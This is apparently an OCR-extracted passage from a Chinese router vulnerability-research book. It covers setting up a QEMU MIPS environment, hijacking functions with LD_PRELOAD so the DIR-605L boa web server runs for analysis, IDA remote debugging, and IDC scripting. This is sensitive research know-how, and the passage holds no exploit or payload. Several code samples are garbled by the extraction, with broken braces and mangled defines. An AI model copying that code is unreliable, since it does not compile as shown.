03 创建 QEMU 网络接口启动脚本，重启网络使配置生效。使用如下命令创建并编辑 /etc/quemu-ifup 文件。

embedded@ubuntu:~$ sudo nano /etc/qemu-ifup

在 QEMU-IFUP 中写入如下内容。

1 #!/bin/sh
2 echo "Executing /etc/qemu-ifup"
3 echo "Bringing up $1 for bridged mode..."
4 sudo /sbin/ifconfig $1 0.0.0.0 promisc up
5 echo "Adding $1 to br0..."
6 sudo /sbin/brctl addif br0 $1
7 sleep 2

保存文件以后，使用如下命令修改 QEMU-IFUP 权限，重启网络使所有配置生效。

$ sudo chmod a+x /etc/qemu-ifup
$ sudo /etc/init.d/networking restart

04 QEMU 启动设置。

启用桥接网络，示例如下。

embedded@ubuntu:~/Debian$ sudo ifdown eth0
embedded@ubuntu:~/Debian$ sudo ifup br0
ssh stop/waiting
ssh start/running, process 31128

下载 MIPS 虚拟机。访问 http://pepole.debian.org/~aurel32/qemu/，选择大端格式或者小端格式的 MIPS 系统，如图 2-23 所示。这里以大端机格式为例，下载内核文件 vmlinux-2.6.32-5-4kc-malta 和磁盘镜像 debian_squeeze_mips_standard.qcow2。

启动 MIPS 虚拟机，示例如下。

embedded@ubuntu:~/Debian$ sudo gemu-system-mips -kernel vmlinux-2.6.32-

5-4kc-malta -hda debian_squeeze_mips_standard.qcow2 -append "root=/dev/sdal
console=ttyS0" -net nic,macaddr=00:16:3e:00:00:01 -net tap -nographic
Executing /etc/qemu-ifup
Bringing up tap0 for bridged mode...
Adding tap0 to br0...
----snip----

 </div>

05 配置 MIPS 系统网络。

使用 “ifconfig -a” 命令查看网络接口是否已分配了 IP 地址，如果没有分配，则可以通过如下方法使用 DHCP 获取 IP 地址。

获取网络接口，示例如下。

root@debian-mips:/etc/network# ifconfig -a
eth1 Link encap:Ethernet HWaddr 00:16:3e:00:00:01
BROADCAST MULTICAST MTU:1500 Metric:1
RX packets:0 errors:0 dropped:0 overruns:0 frame:0
TX packets:0 errors:0 dropped:0 overruns:0 carrier:0
collisions:0 txqueuelen:1000
RX bytes:0 (0.0 B) TX bytes:0 (0.0 B)
Interrupt:10 Base address:0x1020
lo Link encap:Local Loopback
inet addr:127.0.0.1 Mask:255.0.0.0
inet6 addr: ::1/128 Scope:Host
UP LOOPBACK RUNNING MTU:16436 Metric:1

RX packets:8 errors:0 dropped:0 overruns:0 frame:0
TX packets:8 errors:0 dropped:0 overruns:0 carrier:0
collisions:0 txqueuelen:0
RX bytes:560 (560.0 B) TX bytes:560 (560.0 B)
通过ifconfig命令得到网络接口名称为“eth1”。
编辑 /etc/network/interfaces 文件，示例如下。
# nano /etc/network/interfaces

原文件内容如下。
# This file describes the network interfaces available on your system
# and how to activate them. For more information, see interfaces(5).
# The loopback network interface
auto lo
iface lo inet loopback
# The primary network interface
allow-hotplug eth0
iface eth0 inet dhcp

这里将第 7 行和第 8 行的网络接口改为通过 ifconfig 命令得到的网络接口名 “eth1”。/etc/network/interfaces 文件修改后内容如下。

This file describes the network interfaces available on your system
# and how to activate them. For more information, see interfaces(5).
# The loopback network interface
auto lo
iface lo inet loopback
# The primary network interface
allow-hotplug eth1
iface eth1 inet dhcp
保存文件内容。
使用 ifup 命令启用 eth1 网络接口，示例如下。
root@debian-mips:/etc/network# ifup eth1
Internet Systems Consortium DHCP Client 4.1.1-P1
Copyright 2004-2010 Internet Systems Consortium.
All rights reserved.
For info, please visit https://www.isc.org/software/dhcp/
[ 713.024000] eth1: link up
Listening on LPF/eth1/00:16:3e:00:00:01

8 Sending on LPF/eth1/00:16:3e:00:00:01
9 Sending on Socket/fallback
10 DHCPDISCOVER on eth1 to 255.255.255.255 port 67 interval 4
11 DHCPOFFER from 192.168.230.254
12 DHCPREQUEST on eth1 to 255.255.255.255 port 67
13 DHCPACK from 192.168.230.254
14 bound to 192.168.230.129 -- renewal in 898 seconds.

使用 ifconfig 和 ping 命令进行测试，如下状态即为网络已连通。

root@debian-tips:/etc/network# ifconfig
eth1 Link encap:Ethernet HWaddr 00:16:3e:00:00:01
inet addr:192.168.230.129 Bcast:192.168.230.255
Mask:255.255.255.0
inet6 addr: fe80::216:3eff:fe00:1/64 Scope:Link
UP BROADCAST RUNNING MULTICAST MTU:1500 Metric:1
RX packets:41 errors:1 dropped:190 overruns:0 frame:0
TX packets:9 errors:0 dropped:0 overruns:0 carrier:0
collisions:0 txqueuelen:1000
RX bytes:3790 (3.7 KiB) TX bytes:1138 (1.1 KiB)
Interrupt:10 Base address:0x1020
Link encap:Local Loopback
inet addr:127.0.0.1 Mask:255.0.0.0
inet6 addr: ::1/128 Scope:Host
UP LOOPBACK RUNNING MTU:16436 Metric:1
RX packets:8 errors:0 dropped:0 overruns:0 frame:0
TX packets:8 errors:0 dropped:0 overruns:0 carrier:0
collisions:0 txqueuelen:0
RX bytes:560 (560.0 B) TX bytes:560 (560.0 B)
root@debian-tips:/etc/network# ping www.baidu.com
PING www.a.shifen.com (61.135.169.125) 56(84) bytes of data.
64 bytes from 61.135.169.125: icmp_req=1 ttl=128 time=48.3 ms
64 bytes from 61.135.169.125: icmp_req=2 ttl=128 time=46.9 ms
^C
--- www.a.shifen.com ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1002ms
rtt min/avg/max/mdev = 46.998/47.681/48.364/0.683 ms

第 1 行：使用 ifconfig 命令查看，MIPS 主机已分配的 IP 地址为 192.168.230.129。

第 19 行：使用 ping 命令进行测试，网络已经连通，状态良好。

到这里我们就完成了路由器安全研究基本分析环境的搭建。在安装分析环境的过程中，可能会遇到一些异常告警，通过搜索引擎寻找解决方案便是最佳选择。

### 第 3 章 路由器漏洞分析高级技能

本章所讲的内容是在路由器安全研究过程中可能会涉及的一些高级技能，包括：修复路由器运行环境；使用 IDA 提供的强大的脚本功能提高发现漏洞的效率，使漏洞分析具有一定的自动化能力；使用 Python 快速开发 POC（概念验证代码），以进行快速的漏洞验证及利用。

## 3.1 修复路由器程序运行环境

当搭建好 QEMU 以后，大家一定会迫不及待地想使用模拟器（QEMU）运行路由器中的应用程序（如路由器中的 Web 服务器），但可能会遇到路由器相关硬件模块缺失导致应用程序启动失败的情况。本节将以 D-Link DIR-605L（FW_113）路由器中的 Web 应用程序 boa 为例，介绍如何通过劫持函数调用来修复这些问题，使程序在模拟器中能够顺利执行。以后遇到类似的问题时，可以举一反三，采取相同或相似的方法解决路由器中的应用程序执行问题。

修复路由器程序的执行流程大致如下。

运行程序，定位导致程序异常的函数。

分析导致异常的函数，编写一个具有相同功能的函数，在函数中伪造执行流程和数据，并将编写的函数封装成一个新的动态库。

使用 LD_PRELOAD 环境变量加载新的动态库来劫持目标程序中的异常函数，使目标程序执行动态库中的函数。

#### 3.1.1 固件分析

从 D-Link 官方技术支持网站下载固件，下载链接为 ftp://ftp2.dlink.com/PRODUCTS/DIR-605L/REVA/DIR-605L_FIRMWARE_1.13.ZIP，解压缩后得到固件 dir605L_FW_113.bin。

使用 Binwalk 将固件中的文件系统提取出来，如图 3-1 所示。

在提取出的根文件系统中搜索目标 Web 服务器程序 boa，命令为 “./bin/boa”，如图 3-2 所示。

图3-1

 </div>

#### 3.1.2 编写劫持函数动态库

获取运行错误信息，定位异常函数。初次运行 boa 的错误提示信息如下。

$ cp $(which qemu-mips) ./
$ sudo chroot ./qemu-mips ./bin/boa
Initialize AP MIB failed!
Segmentation fault

使用 IDA 对 boa 进行分析，搜索错误提示字符串 “Initialize AP MIB failed!”，在 0x0041823C 位置下断点，然后使用如下命令重新执行 boa。

$ sudo chroot ./qemu-mips -g 1234 ./bin/boa

使用 IDA 动态调试 boa，发现 apmib_init() 函数执行完毕会返回 0。程序在 0x00418228 位置跳转指令后，执行 puts("Initialize AP MIB failed!") 函数，然后直接返回，如图 3-3 所示。此时，程序将会崩溃，Web 服务器启动失败。

ewA X " " Strings window | X 106 Hex View A | X ✗ Structures | X En Enums | X ✗ Imports | X ✗ Exports |
LOAD: 00418208 addiu $a0, (aGetfwinfo - 0x490000) # "getFwInto"
LOAD: 0041820C 1w $gp, 0x38+var_28($sp)
LOAD: 00418210 nop
LOAD: 00418214 la $t9, apmib_init
LOAD: 00418218 nop
LOAD: 0041821C | $t9; apmib_init
LOAD: 00418220 nop
LOAD: 00418224 1w $gp, 0x38+var_28($sp)
LOAD: 00418228 bnez $v0, loc_418250
LOAD: 0041822C nop
LOAD: 00418230 1a $a0, 0x490000
LOAD: 00418234 1a $t9, puts
LOAD: 00418238 nop
LOAD: 0041823C jalr $t9; puts
LOAD: 00418240 addiu $a0, (aInitializeApMn - 0x490000) # "Initialize AF MIE talled!"
LOAD: 00418244 1w $gp, 0x38+var_28($sp)
LOAD: 00418248 b loc_4184B4
LOAD: 0041824C nop
LOAD: 00418250 #

 </div>

分析发现，函数  $ \text{apmib\_init} $ 来自动态链接库  $ \text{apmib.so} $。打开 DIR-605L 路由器根文件系统下的 lib 文件夹，使用 IDA 加载分析  $ \text{apmib.so} $，找到  $ \text{apmib init()} $ 函数的代码，如图 3-4 所示。

 </div>

该函数功能很复杂，通过动态调试和静态反汇编对函数代码进行分析，`apmib_init()` 函数内的代码处理流程对模糊测试没有影响，因此，可以伪造 `apmib_init()` 函数直接返回值 1，让程序执行完 `apmib_init()` 函数之后，在执行 0x00418228 指令时跳转到 0x00418250，正常初始化其他参数。

根据对异常函数  $ apmib\_init() $ 的分析，编写新的  $ apmib\_init() $ 函数，代码如下。

##### 源码 系统调用劫持 apmib.c 部分代码 1

#include <stdio.h>
#include <stdlib.h>
int apmib_init(void)
{
    // Fake it.
    return 1;
}

使用如下命令编译生成动态库 apmib-ld.so。

$ mips-linux-gcc -Wall -fPIC -shared apmib.c -o apmib-ld.so

#### 3.1.3 运行测试

将编译好的 apmib-ld.so 动态链接库复制到 DIR-605L 路由器根文件系统的根目录下，如图 3-5 所示。

 </div>

因为这里是使用共享库编译的，所以需要把交叉编译环境下的 libgcc_s.so.1 动态库复制到 DIR-605L 路由器根文件系统的 lib 目录下。

使用 LD_PRELOAD 环境变量加载 apmib-ld.so，劫持 apmib.so 中的 apmib_init() 函数，命令如下。

$ sudo chroot ./ ./qemu-mips -E LD_PRELOAD="/apmib-ld.so" ./bin/boa

此时，错误提示 “Initialize AP MIB failed!” 已经被修复了，如图 3-6 所示。

 </div>

可以看到，尽管我们修复了“Initialize AP MIB failed!”，但是程序还是崩溃了。在apmib_init()函数的0x0041821C处下断点，执行如下命令，运行boa。

$ sudo chroot ./ ./qemu-mips -E LD_PRELOAD="/apmib-ld.so" -g 1234 ./bin/boa

进行 IDA 远程调试，程序在 apmib_init() 函数中断下以后，使用快捷键 “F8” 进行单步调试，调试到 apmib_get() 函数时程序崩溃，如图 3-7 所示。

 </div>

因此，我们还需要劫持 apmib_get() 函数。查看 apmib.so 中 apmib_get() 函数的汇编代码，通过对代码功能的分析，将劫持函数整理如下。

源码  $ \underline{\text{ampib.c 部分代码 2}} $
1 #define MIB_IP_ADDR 170
2 #define MIB_HW_VER 0x250
3 #define MIB_CAPTCHA 0x2C1

揭秘家用路由器 Oday 漏洞挖掘技术

void apmib_get(int code, int *value)
{
    switch(code)
    {
        case MIB_HW_VER:
            *value = 0xF1;
        break;
    }
    case MIB_IP_ADDR:
        *value = 0x7F000001;
    break;
    case MIB_CAPTCHA:
        *value = 1;
    break;
}

return;

}

为了使用 IDA 进行调试，我们把 boa 中的 fork() 函数一并劫持，形成最终的 boa 劫持代码，具体如下。

#include <stdio.h>
#include <stdlib.h>
#define MIB_IP_ADDR 170
#define MIB_HW_VER_0x250
#define MIB_CAPTCHA_0x2C1
int apmib_init(void)
{
    // Fake it.
    return 1;
}
int fork(void)
{
    return 0;
}
void apmib_get(int code, int *value)
{
    switch (code)
    {
        case MIB_HW_VER:
            *value = 0xF1;
        }
    }
}

21 break;
22 case MIB_IP_ADDR:
23 *value = 0x7F000001;
24 break;
25 case MIB_CAPTCHA:
26 *value = 1;
27 break;
28 }
29 return;
30 }

使用命令编译最终的 apmib.c，生成 apmib-ld.so，具体如下。

$ mips-linux-gcc -Wall -fPIC -shared apmib.c -o apmib-ld.so

将生成的 apmib-ld.so 复制到 DIR-605L 路由器的根文件系统下，然后使用下面的命令运行 boa。

$ sudo chroot ./ ./qemu-mips -E LD_PRELOAD="/apmib-ld.so" ./bin/boa

可以看到，boa 已经开始运行了，如图 3-8 所示。

(×—10: embedded@ubuntu-7/dir605LFW_113bin.extracted/squashif-tool-1)
embeddedaubuntub-7/dlr605L_FW_113-bin.extracted/squashif-root-15: sudo chroot //
/gemu-mips -E LD_PRELOAD="/apmi-ld-so" ./bin/boa
Create chklist file error!
Create chklist file error!
Code: 0x68 (164) Value: 0xFFFFFFF (1-1)
Code: 0x250 (592) Value: 0xF1 (241)
hard ver ls
Create f/w version file error!
Create chklist file error!
Code: 0x38E (916) Values: 0x0 (0)
board server version Boa/0.94.14.rc21
board server built May 25 2012 at 13:03:21.
board starting server pid=4492, port 80
Code: 0x25B (603) Value: 0x0 (0)
Unsupported toctls: cmd=0x89f0
device toctls: Function not implemented
Unsupported toctls: cmd=0x89f0
device toctls: Function not implemented
code: 0x23B (574) Value: 0x0 (0)
code: 0x60 (192) Value: 0x0 (0)
Unsupported toctls: cmd=0x89f0
device toctls: Function not implemented
code: 0x2C4 (708) Value: 0x0 (0)
smart 4B4

 </div>

使用 netstat 命令查看当前网络连接，如图 3-9 所示，已经开启了一个 80 端口的 Web 服务，DIR-605L 路由器中的 Web 服务器 boa 已经成功运行，可以对其进行漏洞分析和测试了。

褐砂家用路由器 Today 漏洞挖掘技术

 </div>

## 3.2 Linux下IDA的反汇编与调试

本节详细介绍 Linux 下 IDA 的静态反汇编与动态调试。

#### 3.2.1 静态反汇编

使用如下命令启动 IDA，如图 3-10 所示。

在欢迎界面单击 “Go” 按钮，如图 3-11 所示。

 </div>

 </div>

进入 IDA 主程序界面，如图 3-12 所示。

 </div>

依次单击 “File” → “Open” 选项，找到需要进行反汇编的程序（以 DIR-605L 路由器的 BusyBox 为例），然后单击 “Open” 按钮，如图 3-13 所示。

 </div>

IDA 已经自动识别程序为 MIPS 架构，处理器的类型是 Inter 80x86，单击 “OK” 按钮，如图 3-14 所示。

可以看到，IDA 已经自动识别了 BusyBox 所使用的 CPU 类型，并自动将其翻译成了 MIPS 汇编代码，如图 3-15 所示。

鸿蒙路由器 (OAY 漏洞挖掘技术

 </div>

 </div>

至此，我们就完成了使用 IDA 进行静态反汇编的工作。

### 3.2.2 动态调试

下面仍然以从 DIR-605L 路由器固件中提取的 BusyBox 为例，介绍 IDA 的远程调试功能。所有版本的 IDA 均附带用于实现远程调试会话的服务器组件。此外，IDA 还可以连接到使用

gdbserver 或者内置 GDB 存根的远程 GDB 会话。远程调试的优点之一是它能够将 GUI 调试器界面作为任何调试会话的前端。在大多数情况下，远程调试会话与本地调试会话没有明显的区别。

在路由器漏洞的研究过程中，因为 QEMU 支持是支持 GDB 远程调试的，所以经常会使用 QEMU 模拟运行路由器文件系统中的程序，然后使用 IDA 对程序进行调试。接下来我们就看看如何使用 QEMU 和 IDA 配合进行程序的远程调试。

所谓远程调试是指通过网络调试在另一个网络上的计算机中运行的代码的过程。当然，也可以在本地计算机上使用远程调试功能。运行被调试应用程序的计算机（或模拟器）称为调试器服务器，运行 IDA Pro 界面的计算机称为调试器客户端。

# 1. 调试服务器

首先介绍调试服务器 QEMU 的使用方法。

编辑一个使用 QEMU 指令执行模拟器测试的脚本，示例如下。

源码 QEMU 调试选项集成脚本 test_busybox.sh

debug
#!/bin/bash
INPUT=$1
LEN=$(echo -n "$INPUT" | wc -c)
PORT="1234"
if ["$LEN" == "0"] || ["$INPUT" == "-h"] || ["$UID" != "0"]
then
echo "\nUsage: sudo $0 \n"
exit 1
fi
cp $(which qemu-mips) ./qemu
echo "$INPUT" | chroot . ./qemu -E CONTENT LENGTH=$LEN -g $PORT
/bin/busybox 2>/dev/null
rm -f ./qemu

第 3 行：获取 bash 脚本的第一个参数作为 BusyBox 的输入参数。

第 4 行：计算输入参数的长度。

第 5 行：定义 QEMU 的调试端口为 1234。

第 6 行～第 10 行：判断参数个数、类型是否正确。如果有错误，将显示使用方法，同时定义此脚本需要 root 权限执行。

第 11 行：将大端机格式的 QEMU-MIPS 指令模拟程序复制到当前目录下，并将其更名为 “qemu”。

第 12 行：使用 QEMU 指令模式模拟执行 BusyBox，相当于执行 “chroot . ./qemu -E CONTENT_LENGTH=$LEN -g 1234 /bin/busybox $INPUT” 命令。在这里，“-E”选项指定的环境变量 CONTENT_LENGTH 对测试 BusyBox 毫无用处，它在测试 CGI 脚本时才能发挥实际的用处（此处只是对它的使用方法进行举例说明）。

第 13 行：使用完 QEMU 模拟程序后将其删除。

准备好调试选项集成脚本以后，将 test_busybox.sh 的调试脚本启动，命令如下。

embedded@ubuntu:~/Firmware/_dir605L_FW_113.bin.extracted/squashfs-root-1$ sudo sh test_busybox.sh "argument"

根据脚本进行调试，相当于执行如下命令。

chroot . ./qemu -E CONTENT_LENGTH=8 -g 1234 /bin/busybox "argument"

完成 MIPS 程序的模拟启动以后，QEMU 内置的 gdbserver 功能就在端口 1234 等待调试器连接。

# 2. 调试客户端

在启动调试服务端以后，我们可以在任何支持操作系统上运行 IDA，并把它作为连接调试服务器的客户端界面。但是，在任何时候，服务器都只能处理 1 个活动的调试会话，如果希望保持多个同步的调试会话，就必须在不同的 TCP 端口上启动多个调试服务器实例。

IDA Pro 使用 GDB 调试器进行调试时有两种方法，分别是附加调试和运行调试。

##### (1) 附加调试

在进行附加调试时，IDA 中没有打开数据库，可以依次单击 “Debuffer” → “Attach” → “Remote GDB debugger” 选项指定服务器使用的调试器类型为 GDB，如图 3-16 所示。

 </div>

在选择了一个调试器 GDB 作为远程调试器以后，将会看到如图 3-17 所示的配置对话框。在这里，需要提供一些适当的连接参数。本例使用 Ubuntu 中安装的 IDA Pro 进行远程调试，而远程调试服务器也与 IDA 在同一台机器上，因此，IDA 连接的远程主机地址为 127.0.0.1，而远程的调试端口为服务端调试脚本中指定的 1234。因为一个程序在调试的过程中可能会多次重启 IDA 进行调试，所以需要勾选 “Save network settings as default” 复选框。

 </div>

此外，因为 IDA 默认提供 Inter x86 系统的调试选项，所以需要单击 “Debug Options” 按钮，对其中的一些调试选项进行进一步的设置，如图 3-18 所示。

 </div>

为了使 IDA 附加到远程调试服务器以后在程序开始的地方断下，需要勾选 “Events” 设置区中的相应选项。因为接下来要调试的是 MIPS 程序，所以需要单击 “Set specific options”

按钮设置一些高级选项。如图 3-19 所示，选择处理器类型为 MIPS。在这里，从 DIR-605L 路由器固件中提取出来的文件系统是大端机格式，因此需要选中 “Big endian” 单选项。

 </div>

设置完以上的选项以后，单击所有弹出窗口中的 “OK” 按钮，直到弹出如图 3-20 所示的进程选择界面。

 </div>

双击 ID 为 0 的选项指定的进程后，IDA 将进入调试模式，可以看到如图 3-21 所示的界面。程序停在了地址 0x40801AC0 处，Debugger 窗口显示的反汇编信息中没有关于函数、变量的信息，这是因为我们是通过附加调试的方法连接的，IDA 并没有通过扫描 BusyBox 产生任何带有符号信息的数据库。这是附加调试的一个缺点。接下来将介绍的运行调试可以很好地克服这个缺点。

 </div>

##### (2) 运行调试

使用 IDA 加载 BusyBox 进行反汇编分析。反汇编分析完成以后，如图 3-22 所示。

 </div>

反汇编完成后，在 main() 函数的地址 0x00403490 处设置断点，然后依次单击 “Debugger” → “Process Options” 命令，通过指定的服务器主机名称与端口启动，打开如图 3-23 所示的对话框。

栴砲家用路由器 Oday 漏洞挖掘技术

##### 图3-23

Application：要调试的应用程序的完整二进制路径。对于远程调试会话，该路径为调试服务器上的路径。如果选择了不适用完整路径的选项，远程服务器将搜索它的当前工作目录。同时，如果通过事先加载 BusyBox 进行反汇编，那么在启动 “Process Options” 时这里已经填充了当前 BusyBox 的路径信息，从而避免再输入复杂的路径信息。在本例中，虽然使用了远程调试，但是因为 QEMU 模拟运行的 BusyBox 就运行在当前的 Ubuntu 系统中，故不需要对该地址进行修改。

Input file: 用于创建 IDA 数据库文件的完整路径。对于远程调试会话，该路径为调试服务器上的路径。如果选择了不适用完整路径的选项，远程服务器将搜索其当前工作目录。这里与“Application”一样，也不需要修改。

Parameters: 用于指定在进程启动时传递给它任何命令行参数。需要注意的是，其中不能包含任何 Shell 元字符，如 “<”、“>”、“|”，任何此类字符都将作为命令行参数传递给进程。因此，将无法在调试器中启动一个进程，并让该程序执行任何类型的输入和输出重定向。对于远程调试会话，进程输出将在用于启动调试服务器的控制台中显示。

Hostname: 远程调试服务器主机或 IP 地址。

Port: 远程调试服务器监听的 TCP 端口。

配置进程选项以后，单击 “OK” 按钮，依次选择 “Debugger” → “Attach to Process” 选项，连接到远程调试服务器的调试进程。

在连接到远程调试服务器以后，IDA 会进入调试模式，在地址 0x00403490 处下断点，如图 3-24 所示。可以看到，使用 IDA 的运行调试模式时，因为加载了数据库，所以在调试窗口中会给出函数堆栈情况、变量及函数等符号信息。

在上面提到的两种调试方法中，如果是使用 IDA 与 QEMU 指令模拟程序进行远程调试，建议使用运行调试模式。运行调试模式既拥有强大的符号信息支持，设置断点也更加方便，非常有利于调试。

 </div>

## 3.3 IDA脚本基础

尽管 IDA Pro 本身已经是一款功能极为强大的反汇编器，但是很少有一款软件能够满足用户的所有需求。因此，为了向用户提供尽可能多的灵活性，IDA Pro 在设计时已经充分考虑了程序的可扩展性。这些功能包括用于实现简单任务自动化的自定义脚本语言，以及一个可以实现更为复杂的编译型扩展的插件结构。

IDA Pro 内建的脚本语言名为 IDC。IDC 是一门与 C 语言类似的语言，但是它是解释型的，不是编译型的。IDA 还集成了 IDAPython 插件来支持 Python 的集成式脚本。

本节将介绍编写和执行 IDC 和 IDA Python 脚本的基础知识，以及一些常用的函数。在路由器漏洞挖掘中，我们会使用 IDA 脚本的功能编写一个自动化漏洞审计脚本。

#### 3.3.1 执行脚本

在学习如何编写 IDA 脚本（IDC 和 IDAPython）之前，我们先看看在 IDA 中都有哪些方法可以执行 IDA 脚本。

一共有 3 种方法可以执行 IDA 脚本，分别是 IDC 命令行（在菜单栏中依次选择 “File” → “IDC Command” 选项）、脚本文件（在菜单栏中依次选择 “File” → “Script File” 选项）和 Python 命令行（在菜单栏中依次选择 “File” → “Python Command” 选项）。

使用 “Script File” 选项表示我们希望运行一个独立的脚本文件。此时，IDA 会显示一个选择文件对话框，我们选择需要运行的脚本即可。每运行一个脚本，都会被记录在 “最近运

行脚本列表”中，可以通过“View”→“Recent Scripts”菜单项访问，双击运行历史脚本可以执行该脚本。

如果只是在脚本对话框中执行了一些简单的语句，那么我们没有必要建立一个功能全面的脚本文件，而可以采用“IDC Command”的方式运行。依次选择“File”→“IDC Command”选项，打开一个输入对话框，如图3-25所示，输入需要执行的语句，单击“OK”按钮，即可执行语句。如果需要执行的是“Python Command”，方法类似。

 </div>

IDA 命令行仅适用于 GUI 版本的 IDA。IDA 命令行默认是启用的，它位于 IDA 工作区的左下角，输出窗口的下方。将用于执行命令行的解释器在命令行输入框的左侧标注。如图 3-26 所示，IDA 配置命令行执行 IDC 语句。单击此标签，将弹出菜单，可以将解释器（IDC 或 Python）与命令行关联起来。

 </div>

#### 3.3.2 IDC语言

IDC 脚本语言借用了 C 语言的许多语法。从 IDA 5.6 开始，IDC 在面向对象特性和异常处理方面与 C++ 更为相似。因为 IDC 语言与 C 语言及 C++ 语言的语法类似，所以下面主要

依据这些语言介绍 IDC 语言，并重点介绍 IDC 脚本语言与它们的区别。

# 1. IDA语言基础

在 IDC 中使用 C++ 风格的 “//” 进行单行注释，采用 C 风格的 “/* */” 进行多行注释。此外，可以在一个语句中申明多个变量，且 IDC 中所有的语句与 C 语言均使用分号作为终止符。但是，IDC 并不支持 C 语言风格的数组、指针、结构体、联合等复杂的数据类型。

##### (1) IDA帮助系统

IDA 为我们提供了一个十分有用的帮助系统，该帮助系统介绍了 IDA Pro 的一些基本功能和使用方法，以及 IDC 脚本提供的功能函数。下面我们就来看看如何使用 IDA 帮助系统获取 IDC 函数的帮助信息。

打开 IDA Pro，使用快捷键 “F1” 打开帮助系统，如图 3-27 所示。

 </div>

在帮助系统中单击 “Index of IDC functions” 超链接，可以看到按字母顺序排列的 IDC 函数列表，如图 3-28 所示。

揭秘家用路由器 Oday 漏洞挖掘技术

 </div>

使用快捷键 “Ctrl+F” 可以搜索需要的函数，本例中输入 “Rfirst”，如图 3-29 所示。

 </div>

搜索到需要的函数以后，可以进入详细信息页面查看该函数的具体定义及使用方法，如图 3-30 所示。

 </div>

在 IDC 脚本的编写过程中，也许经常会遇到忘记函数的参数或者不知道应该使用哪一个 IDC 函数的情况，此时，IDA 帮助系统将是我们最好的选择，它的存在可以在一定程度上减轻我们记忆 IDC 函数的负担。

##### (2) IDC变量

IDC 是一种类型松散的语言，也就是说，它的变量没有明确的类型。IDC 主要使用 3 种数据类型，分别是整型（long）、字符串型和浮点值。虽然 IDC 变量没有明确的类型，但是在使用任何变量前都必须声明该变量，这一点与 C 语言相似。

IDC 支持局部变量和全局变量。IDC 局部变量的声明举例如下。

auto addr, reg, val; //多个变量同时声明，未初始化

auto valinit=0; //声明的同时初始化

IDA 使用 extern 关键字引入全局变量的声明。我们可以在任何函数定义的内部和外部声明全局变量，但是不能在声明全局变量时为其提供初始值。全局变量定义举例如下。

extern outval;
extern illeval="wrong";

// 合法定义，定义全局变量 outval
// 非法定义，声明全局变量时不能初始化

揭秘家用路由器 0day 漏洞挖掘技术

static main() {
    extern insideval; // 合法定义全局变量insideval
    outval = "Global String"; // 为全局变量赋值
    insideval = 1;
}

在 IDA 会话过程中首次遇到全局变量时，IDA 会对全局变量进行空间分配。只要该会话处于活动状态，那么无论打开或关闭多少数据库，这些变量始终有效。

##### (3) IDC表达式

IDC 几乎支持 C 语言中所有的算术和逻辑运算符，包括三元运算符 “?”。但是，IDC 在表达式上与 C 语言有以下区别。

复合赋值运算：IDC 不支持“op=”形式的复合赋值运算符，如“+=”、“*=”、“>=”等。

整数处理：在 IDC 中，所有的整数操作都作为有符号的值处理。因为此时的移位操作都是按照算术移位处理的，所以这样的处理方法会影响整数的比较和位运算的右移

(>>) 操作。怎样才能实现逻辑右移呢？可以使用如下的方法进行操作。将 x 右移 1 位以后，将最高位清零，即可实现与逻辑右移相同的效果。

Result = (x >> 1) & 0x7FFFFFF

字符串的操作：在 IDC 中，不再需要 C 语言中的 strcpy 等复制和连接函数，可以直接使用 “+” 进行操作。同时，IDC 引入了类似 Python 的字符串切片操作，使截取字符串变得更方便。字符串操作实例如下。

auto str0 = "this_is";
auto str1 = str0 + "_test"; // 将字符串连接成“this_is_test”
auto s0, s1, s2, s3, s4;
s0 = str1[5:7]; // “is”，字符串下标从0开始
s1 = str1[:4]; // “this”，截取下标0~4之间的字符串
s2 = str1[8:]; // “test”，截取8到字符串结尾的字符串
s3 = str1[4]; // “_”，截取下标为4的字符
s4 = str1[:5]; // “this_is”，截取0到倒数第5个字符

##### (4) IDC语句

与 C 语言一样，在 IDC 中，所有的简单语句都是以分号结束的，而 switch 语句是 IDC 唯一不支持的 C 风格复合语句。与 C 语言相比，IDC 还有以下用法上的不同。

在使用 for 循环时，由于 IDC 不支持复合赋值运算符，因此，如果需要使用除了 1 以外的其他值作为步长进行计数，需要注意如下几点。

auto i;
for (i=0; i<5; i++) {} // 合法，使用1作为步长计数
for (i=0; i<5; i+=2) {} // 非法，不支持复合赋值运算符“+=”
for (i=0; i<5; i+=1+2) {} // 合法，使用2作为步长计数

在复合语句中，IDC 使用和 C 语言一样的花括号语法和语义。在花括号中可以声明新的变量，只要变量声明位于花括号内的第一个语句即可。但是，IDC 并不严格限制新引入的变量的作用范围，因此，可以从声明这些变量的花括号外进行引用，举例如下。

if (1)
{
    auto x;
    x = 10;
}
else
{
    auto y;
    y = 3;
}
Message("x = %d\ny = %d\n", x, y);

在上面的代码中，Message() 函数与 C 语言中的 printf 函数类似。在这里，Message() 函数用于将信息输出到输出窗口，如图 3-31 所示。

Output window

x = 10
y = 0

Python

Down

 </div>

可以看到，以上脚本的打印结果为“x=10, y=0”。由于 IDC 并没有严格限制 x 作用域，因此我们可以打印出 x 的值。令人疑惑的是，虽然声明 y 的代码块并没有被执行，但我们依然可以访问 y 值。还有一点值得注意的是，虽然 IDC 并没有严格限制变量在函数中的作用域，但是在一个函数中，我们不能访问其他任何函数中声明的变量。因此，建议在定义和使用变量时尽量采用 C 语言风格，从而避免以上提到的这些 IDC 特性对执行结果产生不可预见的影响。

##### (5) IDC函数

IDC 命令对话框不支持用户自定义函数，仅在独立的 .idc 文件中支持用户自定义函数。因此，使用菜单栏中的 “File” → “IDC Command” 方式执行时，不能自定义函数。如果需要引入自定义函数，实现更为复杂的功能，建议将脚本保存为独立的 .idc 文件，使用菜单栏中的 “File” → “Script File” 选项加载运行。

IDC 函数定义，static 关键字引入用户自定义函数，函数参数列表仅包含用逗号分隔的参数列表，代码如下所示。

static exp_func(x, y, z) {
    auto x1, y1, z1;
    x = 11;
    y = 22;
    z = 33;
    return 1;
}

在 IDC 5.6 之前，所有的函数参数都严格采用传值调用方式。然而，在 IDA 5.6 之后引入了传地址参数传递机制，在函数调用中使用一元运算符并说明该函数参数采用传地址方式传递参数即可，举例如下（exp_func() 函数定义接上例）。

exp_func(a, b, c);    //a、b、c均采用值传递
Message("av=%d,bv=%d,cv=%d\n", a, b, c);
exp_func(a, &b, c);    //a、c采用值传递，而b采用传地址参数传递
Message("av=%d,br=%d,cv=%d\n", a, b, c);

运行代码后输出的结果如下。

 $ av=0,bv=1,cv=2 $
 $ av=0,br=22,cv=2 $

可以看到，采用传地址参数传递方式时，在调用 exp_func() 函数之后，b 的值被修改为 22。

